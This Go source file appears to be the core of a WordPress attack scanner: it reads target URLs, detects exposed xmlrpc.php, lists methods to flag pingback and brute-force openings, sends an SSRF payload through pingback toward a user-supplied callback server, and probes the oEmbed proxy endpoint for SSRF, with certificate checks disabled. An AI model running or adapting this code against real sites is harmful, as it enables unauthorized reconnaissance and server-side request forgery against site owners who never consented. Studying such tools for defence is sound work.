package core

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"../utils"
	"github.com/fatih/color"
)

const ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/t0gu)"

//Scan struct
type Scan struct {
	target string
	server string
}

//New Create constructor
func New(t string, s string) *Scan {
	return &Scan{target: t, server: s}
}

func newClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:    30,
		IdleConnTimeout: time.Second,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	return &http.Client{
		Transport:     tr,
		CheckRedirect: re,
		Timeout:       time.Second * 10,
	}
}

//FromStdin test results from stdin
func (s *Scan) FromStdin() {
	var wg sync.WaitGroup
	sc := bufio.NewScanner(os.Stdin)

	for sc.Scan() {
		rawURL := sc.Text()
		wg.Add(1)

		go func() {
			defer wg.Done()

			if s.IsAlive(rawURL) {
				s.VerifyMethods(rawURL)
			}
		}()
	}
	wg.Wait()
}

//IsAlive veirfy if xmlrpc is open
func (s *Scan) IsAlive(url string) bool {

	cli := newClient()

	urlRequest := url + "/xmlrpc.php"
	req, err := http.NewRequest("GET", urlRequest, nil)
	req.Header.Set("User-Agent", ua)

	if err != nil {
		return false
	}

	resp, err := cli.Do(req)
	if err != nil {
		return false
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	responseBody := string(body)

	matchedString, err := regexp.MatchString(`XML-RPC server accepts POST requests only`, responseBody)

	if matchedString {
		return true
	}

	return false
}

//VerifyMethods verify methods xmlrpc
func (s *Scan) VerifyMethods(url string) {

	cli := newClient()
	body := "<methodCall> <methodName>system.listMethods</methodName> </methodCall>"
	urlReq := url + "/xmlrpc.php"
	req, err := http.NewRequest("POST", urlReq, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", ua)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	res, err := cli.Do(req)
	if err != nil {
		log.Println(err)
	}

	bodyString, err := ioutil.ReadAll(res.Body)

	if err != nil {
		log.Println(err)
	}

	b := string(bodyString)

	matchedStringPing, err := regexp.MatchString(`(<value><string>pingback.ping</string></value>)`, b)
	if err != nil {
		log.Println(err)
	}

	if matchedStringPing {
		color.Magenta("[+] Pingback open at [%s]\n", url)

	}

	s.Ssrf(url)

	matchedStringBrute, err := regexp.MatchString(`(<value><string>blogger.getUsersBlogs</string></value>)`, b)

	if err != nil {
		log.Println(err)
	}

	if matchedStringBrute {
		color.Magenta("[+] blogger.getUsersBlogs open at [%s]\n", url)
	}

}

//Ssrf testing ssrf if avaliable
func (s *Scan) Ssrf(target string) {
	url := target + "/xmlrpc.php"

	xml := utils.SSRF

	replaceServer := strings.ReplaceAll(xml, "$SERVER$", s.server)
	replaceTarget := strings.ReplaceAll(replaceServer, "$TARGET$", target)

	body := replaceTarget

	c := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", ua)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	resp, err := c.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	if resp.StatusCode == 200 {
		color.Yellow("[*] SSRF testing..\n")
	}
	color.Cyan("[+] SSRF TEST DONE at [%s]: verify at [%s] if a HTTP connection was recevied", s.target, s.server)

}

//ProxyTesting testing oem proxyng server
func (s *Scan) ProxyTesting() {
	client := newClient()

	url := s.target + "/wp-json/oembed/1.0/proxy?url=" + s.server + "/nullfil3"

	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", ua)
	if err != nil {
		log.Println(err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}

	if resp.StatusCode == 200 {
		color.Cyan("[+] wp-json/oembed/1.0/proxy open, verify is a HTTP was recevied at your server..")
	}

}
